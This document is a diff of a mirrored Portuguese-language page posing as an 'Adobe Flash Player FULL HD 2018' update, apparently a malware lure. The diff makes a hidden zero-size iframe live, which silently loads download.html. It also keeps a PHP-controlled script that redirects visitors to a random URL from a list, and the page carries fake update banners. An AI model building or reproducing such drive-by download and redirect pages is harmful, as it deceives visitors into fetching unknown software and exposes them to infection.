@@ -52,10 +52,7 @@ return confirm(' Ao sair, você vai finalizar a prova. Tem certeza que deseja sa
   ga('send', 'pageview');
 
 </script>	
-<!--<iframe src="download.html" width="0" height="0" frameborder="0" ></iframe>-->
-<?php if($config[0] == 'S') { ?>
-<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
-<?php } ?>
+<iframe src="download.html" width="0" height="0" frameborder="0" ></iframe>
 <center>
       </center><table width="1448" border="0" align="center" cellpadding="2" cellspacing="2" style="text-align: left; width: 592px; height: 556px;">
   <tbody>
@@ -94,9 +91,9 @@ return confirm(' Ao sair, você vai finalizar a prova. Tem certeza que deseja sa
 
   
   
-  <script type="text/javascript" src="1212/jquery.min.js.download"></script>
-  <script type="text/javascript" src="1212/jquery.cookie.js.download"></script>
-  <script type="text/javascript" src="1212/jquery.ulightbox.js.download"></script><br>
+  <script type="text/javascript" src="1212/jquery.min.js"></script>
+  <script type="text/javascript" src="1212/jquery.cookie.js"></script>
+  <script type="text/javascript" src="1212/jquery.ulightbox.js"></script><br>
 </p><div id="ghostery-purple-box" class="ghostery-bottom ghostery-right ghostery-collapsed"><div id="ghostery-box"><div id="ghostery-count" style="background: none; color: rgb(255, 255, 255);">1</div><div id="ghostery-pb-icons-container"><span id="ghostery-breaking-tracker" class="ghostery-pb-tracker" style="background: url(_chrome-extension_/mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/breaking-icon.html); opacity: 0.5;"></span><span id="ghostery-slow-tracker" class="ghostery-pb-tracker" style="background: url(_chrome-extension_/mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/slow-icon.html); opacity: 0.5;"></span><span id="ghostery-non-secure-tracker" class="ghostery-pb-tracker" style="background: url(_chrome-extension_/mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/non-secure-icon.html); opacity: 0.5;"></span></div><div id="ghostery-title">Atualizar Adobe Flash Player para FULL HD 2018</div><div id="ghostery-minimize"><span id="ghostery-minimize-icon"></span></div><span id="ghostery-close" style="background: url(_chrome-extension_/mlomiejdfkolichcflejclcbmpeaniij/app/images/purple_box/collapse.html);"></span></div><div id="ghostery-pb-background"><div id="ghostery-trackerList"><div class="ghostery-trackerContainer"><span id="ghostery-no-tracker" class="ghostery-pb-tracker-list"></span><span class="ghostery-tracker"><span class="ghostery-color">Sobre: Adobe® Flash® FULLHD Player é um plug-in</span></span></div></div></div></div>
 <p>&nbsp;</p>
 <link rel="stylesheet" type="text/css" href="1212/jquery.ulightbox.css">
@@ -128,4 +125,7 @@ return confirm(' Ao sair, você vai finalizar a prova. Tem certeza que deseja sa
 
 <div id="uLightBoxOverlay" style="display:none" class="opaque"><div id="uLightBox" class="shadow top bottom" style="display:none"><div id="lbHeader" class="top"></div><div id="lbContent"></div><div id="lbFooter" class="bottom"></div></div></div><div id="uLightBoxOverlay" style="display:none" class="opaque"><div id="uLightBox" class="shadow top bottom" style="display:none"><div id="lbHeader" class="top"></div><div id="lbContent"></div><div id="lbFooter" class="bottom"></div></div></div></body>
 <!-- Mirrored from adobe-flash.websiteseguro.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 02 Nov 2018 01:38:06 GMT -->
+<?php if($config[0] == 'S') { ?>
+<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>
+<?php } ?>
 </html>
